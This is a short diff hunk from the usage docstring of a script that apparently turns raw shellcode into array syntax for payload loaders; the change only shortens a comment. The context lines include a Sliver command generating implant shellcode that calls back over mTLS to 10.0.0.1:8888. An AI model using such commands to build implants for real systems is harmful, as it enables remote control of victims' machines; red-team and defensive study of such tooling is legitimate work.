@@ -10,7 +10,7 @@ Why this exists:
     binary, so this script converts it into the array syntax each loader needs.
 
 Usage:
-    # 1. Generate Sliver raw shellcode (or use --format raw)
+    # 1. Generate Sliver raw shellcode
     sliver > generate --mtls 10.0.0.1:8888 --format shellcode --save /tmp/sc.bin
 
     # 2. Convert to the format your loader expects
